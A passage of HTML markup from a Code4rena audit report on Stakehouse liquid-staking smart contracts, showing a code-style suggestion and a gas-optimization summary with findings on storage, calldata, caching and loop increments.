class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OptionalHouseGatekeeper</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SavETHVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SavETHVaultDeployer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StakingFundsVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StakingFundsVaultDeployer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SyndicateRewardsProcessor</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OwnableSmartWallet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OwnableSmartWalletFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span></code></pre>\n<h2 id=\"s-01-generate-perfect-code-headers-every-time\" style=\"position:relative;\"><a href=\"#s-01-generate-perfect-code-headers-every-time\" aria-label=\"s 01 generate perfect code headers every time permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[S-01] Generate perfect code headers every time</h2>\n<p><strong>Description:</strong><br>\nI recommend using header for Solidity code layout and readability</p>\n<p><a href=\"https://github.com/transmissions11/headers\">https://github.com/transmissions11/headers</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"175\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/*//////////////////////////////////////////////////////////////</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">                           TESTING 123</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//////////////////////////////////////////////////////////////*/</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/403#issuecomment-1330713505\">vince0656 (Stakehouse) commented</a>:</strong></p>\n<blockquote>\n<p>Good quality</p>\n</blockquote>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this contest, 18 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/331\">report highlighted below</a> by <strong>IllIllI</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/409\">Deivitto</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/397\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/391\">ignacio</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/389\">lukris02</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/384\">c3phas</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/334\">CloudX</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/323\">brgltd</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/318\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/304\">tnevler</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/270\">btk</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/235\">bharg4v</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/192\">Awesome</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/156\">chrisdior4</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/125\">imare</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/62\">Saintcode_</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/51\">skyle</a>, and <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/37\">ReyAdmirado</a>.</em></p>\n<h2 id=\"summary-2\" style=\"position:relative;\"><a href=\"#summary-2\" aria-label=\"summary 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h2>\n<table>\n<thead>\n<tr>\n<th></th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n<th align=\"center\">Total Gas Saved</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[G‑01]</td>\n<td align=\"left\">Multiple <code>address</code>/ID mappings can be combined into a single <code>mapping</code> of an <code>address</code>/ID to a <code>struct</code>, where appropriate</td>\n<td align=\"center\">1</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑02]</td>\n<td align=\"left\">State variables only set in the constructor should be declared <code>immutable</code></td>\n<td align=\"center\">33</td>\n<td align=\"center\">31201</td>\n</tr>\n<tr>\n<td>[G‑03]</td>\n<td align=\"left\">Using <code>calldata</code> instead of <code>memory</code> for read-only arguments in <code>external</code> functions saves gas</td>\n<td align=\"center\">8</td>\n<td align=\"center\">960</td>\n</tr>\n<tr>\n<td>[G‑04]</td>\n<td align=\"left\">State variables should be cached in stack variables rather than re-reading them from storage</td>\n<td align=\"center\">16</td>\n<td align=\"center\">1552</td>\n</tr>\n<tr>\n<td>[G‑05]</td>\n<td align=\"left\">The result of function calls should be cached rather than re-calling the function</td>\n<td align=\"center\">1</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑06]</td>\n<td align=\"left\"><code>&#x3C;x> += &#x3C;y></code> costs more gas than <code>&#x3C;x> = &#x3C;x> + &#x3C;y></code> for state variables</td>\n<td align=\"center\">16</td>\n<td align=\"center\">1808</td>\n</tr>\n<tr>\n<td>[G‑07]</td>\n<td align=\"left\"><code>internal</code> functions only called once can be inlined to save gas</td>\n<td align=\"center\">9</td>\n<td align=\"center\">180</td>\n</tr>\n<tr>\n<td>[G‑08]</td>\n<td align=\"left\"><code>++i</code>/<code>i++</code> should be <code>unchecked{++i}</code>/<code>unchecked{i++}</code> when it is not possible for them to overflow, as is the case when used in <code>for</code>- and <code>while</code>-loops</td>\n<td align=\"center\">38</td>\n<td align=\"center\">2280</td>\n</tr>\n<tr>\n<td>[G‑09]</td>\n<td align=\"left\"><code>require()</code>/<code>revert()</code> strings longer than 32 bytes cost extra gas</td>\n<td align=\"center\">39</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑10]</td>\n<td align=\"left\">Optimize names to save gas</td>\n<td align=\"center\">16</td>\n<td align=\"center\">352</td>\n</tr>\n<tr>\n<td>[G‑11]</td>\n<td align=\"left\"><code>internal</code> functions not called by the contract should be removed to save deployment gas</td>\n<td align=\"center\">2</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑12]</td>\n<td align=\"left\">Don’t compare boolean expressions to boolean literals</td>\n<td align=\"center\">19</td>\n<td align=\"center\">171</td>\n</tr>\n<tr>\n<td>[G‑13]</td>\n<td align=\"left\">Ternary unnecessary</td>\n<td align=\"center\">1</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑14]</td>\n<td align=\"left\">Division by two should use bit shifting</td>\n<td align=\"center\">1</td>\n<td align=\"center\">20</td>\n</tr>\n<tr>\n<td>[G‑15]</td>\n<td align=\"left\">Stack variable used as a cheaper cache for a state variable is only used once</td>\n<td align=\"center\">1</td>\n<td align=\"center\">3</td>\n</tr>\n<tr>\n<td>[G‑16]</td>\n<td align=\"left\">Empty blocks should be removed or emit something</td>\n<td align=\"center\">1</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑17]</td>\n<td align=\"left\">Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</td>\n<td align=\"center\">21</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑18]</td>\n<td align=\"left\">Functions guaranteed to revert when called by normal users can be marked <code>payable</code></td>\n<td align=\"center\">20</td>\n<td align=\"center\">420</td>\n</tr>\n</tbody>\n</table>\n<p>Total: 243 instances over 18 issues with <strong>38947 gas</strong> saved</p>\n<p>Gas totals use lower bounds of ranges and count two iterations of each <code>for</code>-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above as well as its gas numbers do not include any of the excluded findings.</p>\n<h2 id=\"g01-multiple-addressid-mappings-can-be-combined-into-a-single-mapping-of-an-addressid-to-a-struct-where-appropriate\" style=\"position:relative;\"><a href=\"#g01-multiple-addressid-mappings-can-be-combined-into-a-single-mapping-of-an-addressid-to-a-struct-where-appropriate\" aria-label=\"g01 multiple addressid mappings can be combined into a single mapping of an addressid to a struct where appropriate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑01] Multiple <code>address</code>/ID mappings can be combined into a single <code>mapping</code> of an <code>address</code>/ID to a <code>struct</code>, where appropriate</h2>\n<p>Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (<strong>20000 gas</strong>) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save <strong>~42 gas per access</strong> due to <a href=\"https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0\">not having to recalculate the key’s keccak256 hash</a> (Gkeccak256 - 30 gas) and that calculation’s associated stack operations.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"176\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LiquidStakingManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">134</span><span class=\"mtk1\">       </span><span class=\"mtk3\">/// @notice Node runner issued to Smart wallet. Smart wallet address &lt;&gt; Node runner address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">135</span><span class=\"mtk1\">       </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">address</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nodeRunnerOfSmartWallet</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">136</span><span class=\"mtk1\">   </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">137</span><span class=\"mtk1\">       </span><span class=\"mtk3\">/// @notice Track number of staked KNOTs of a smart wallet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">138</span><span class=\"mtk1\">:      </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakedKnotsOfSmartWallet</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/liquid-staking/LiquidStakingManager.sol#L134-L138\">https://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/liquid-staking/LiquidStakingManager.sol#L134-L138</a></p>\n<h2 id=\"g02-state-variables-only-set-in-the-constructor-should-be-declared-immutable\" style=\"position:relative;\"><a href=\"#g02-state-variables-only-set-in-the-constructor-should-be-declared-immutable\" aria-label=\"g02 state variables only set in the constructor should be declared immutable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑02] State variables only set in the constructor should be declared <code>immutable</code></h2>\n<p>Avoids a Gsset (<strong>20000 gas</strong>) in the constructor, and replaces the first access in each transaction (Gcoldsload - <strong>2100 gas</strong>) and each access thereafter (Gwarmacces - <strong>100 gas</strong>) with a <code>PUSH32</code> (<strong>3 gas</strong>). </p>\n<p>While <code>string</code>s are not value types, and therefore cannot be <code>immutable</code>/<code>constant</code> if not hard-coded outside of the constructor, the same behavior can be achieved by making the current contract <code>abstract</code> with <code>virtual</code> functions for the <code>string</code> accessors, and having a child contract override the functions with the hard-coded implementation-specific values.</p>\n<p>*There are 33 instances of this issue. <strong>(For in-depth details on this and all further gas optimizations with multiple instances, see the warden’s <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/331\">full report</a>.)*</strong></p>\n<h2 id=\"g03-using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas\" style=\"position:relative;\"><a href=\"#g03-using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas\" aria-label=\"g03 using calldata instead of memory for read only arguments in external functions saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑03] Using <code>calldata</code> instead of <code>memory</code> for read-only arguments in <code>external</code> functions saves gas</h2>\n<p>When a function with a <code>memory</code> array is called externally, the <code>abi.decode()</code> step has to use a for-loop to copy each index of the <code>calldata</code> to the <code>memory</code> index. <strong>Each iteration of this for-loop costs at least 60 gas</strong> (i.e. <code>60 * &#x3C;mem_array>.length</code>). Using <code>calldata</code> directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having <code>memory</code> arguments, it’s still valid for implementation contracs to use <code>calldata</code> arguments instead. </p>\n<p>If the array is passed to an <code>internal</code> function which passes the array to another internal function where the array is modified and therefore <code>memory</code> is used in the <code>external</code> call, it’s still more gass-efficient to use <code>calldata</code> when the <code>external</code> function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one</p>\n<p>Note that I’ve also flagged instances where the function is <code>public</code> but can be marked as <code>external</code> since it’s not called by the contract, and cases where a constructor is involved</p>\n<p><em>There are 8 instances of this issue.</em></p>\n<h2 id=\"g04-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage\" style=\"position:relative;\"><a href=\"#g04-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage\" aria-label=\"g04 state variables should be cached in stack variables rather than re reading them from storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑04] State variables should be cached in stack variables rather than re-reading them from storage</h2>\n<p>The instances in this report point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (<strong>100 gas</strong>) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.</p>\n<p><em>There are 16 instances of this issue.</em></p>\n<h2 id=\"g05-the-result-of-function-calls-should-be-cached-rather-than-re-calling-the-function\" style=\"position:relative;\"><a href=\"#g05-the-result-of-function-calls-should-be-cached-rather-than-re-calling-the-function\" aria-label=\"g05 the result of function calls should be cached rather than re calling the function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑05] The result of function calls should be cached rather than re-calling the function</h2>\n<p>The instances in this report point to the second+ call of the function within a single function.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"177\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StakingFundsVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit liquidStakingNetworkManager.syndicate() on line 215</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">219</span><span class=\"mtk1\">:                      </span><span class=\"mtk12\">liquidStakingNetworkManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">syndicate</span><span class=\"mtk1\">(),</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/liquid-staking/StakingFundsVault.sol#L219\">https://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/liquid-staking/StakingFundsVault.sol#L219</a></p>\n<h2 id=\"g06-x--y-costs-more-gas-than-x--x--y-for-state-variables\" style=\"position:relative;\"><a href=\"#g06-x--y-costs-more-gas-than-x--x--y-for-state-variables\" aria-label=\"g06 x  y costs more gas than x  x  y for state variables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑06] <code>&#x3C;x> += &#x3C;y></code> costs more gas than <code>&#x3C;x> = &#x3C;x> + &#x3C;y></code> for state variables</h2>\n<p>Using the addition operator instead of plus-equals saves <strong><a href=\"https://gist.github.com/IllIllI000/cbbfb267425b898e5be734d4008d4fe8\">113 gas</a></strong>.</p>\n<p><em>There are 16 instances of this issue.</em></p>\n<h2 id=\"g07-internal-functions-only-called-once-can-be-inlined-to-save-gas\" style=\"position:relative;\"><a href=\"#g07-internal-functions-only-called-once-can-be-inlined-to-save-gas\" aria-label=\"g07 internal functions only called once can be inlined to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑07] <code>internal</code> functions only called once can be inlined to save gas</h2>\n<p>Not inlining costs <strong>20 to 40 gas</strong> because of two extra <code>JUMP</code> instructions and additional stack operations needed for function calls.</p>\n<p><em>There are 9 instances of this issue.</em></p>\n<h2 id=\"g08-ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-as-is-the-case-when-used-in-for--and-while-loops\" style=\"position:relative;\"><a href=\"#g08-ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-as-is-the-case-when-used-in-for--and-while-loops\" aria-label=\"g08 ii should be uncheckediuncheckedi when it is not possible for them to overflow as is the case when used in for  and while loops permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑08] <code>++i</code>/<code>i++</code> should be <code>unchecked{++i}</code>/<code>unchecked{i++}</code> when it is not possible for them to overflow, as is the case when used in <code>for</code>- and <code>while</code>-loops</h2>\n<p>The <code>unchecked</code> keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves <strong>30-40 gas <a href=\"https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked\">per loop</a></strong>.</p>\n<p><em>There are 38 instances of this issue.</em></p>\n<h2 id=\"g09-requirerevert-strings-longer-than-32-bytes-cost-extra-gas\" style=\"position:relative;\"><a href=\"#g09-requirerevert-strings-longer-than-32-bytes-cost-extra-gas\" aria-label=\"g09 requirerevert strings longer than 32 bytes cost extra gas permalink\" 